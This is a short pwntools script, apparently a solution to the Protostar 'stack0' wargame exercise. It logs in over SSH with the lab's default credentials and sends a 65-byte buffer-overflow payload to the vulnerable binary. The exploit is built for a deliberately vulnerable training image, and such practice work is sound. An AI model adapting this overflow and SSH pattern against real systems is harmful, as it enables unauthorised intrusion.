#!/usr/bin/env python
from pwn import *
import sys

if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
else:
    s = ssh("user", sys.argv[1], 22, password="user")
    payload = "A"*65 + '\n'
    r = s.run('/opt/protostar/bin/stack0')
    r.send(payload)
    print(r.recv(1024))
    r.close()

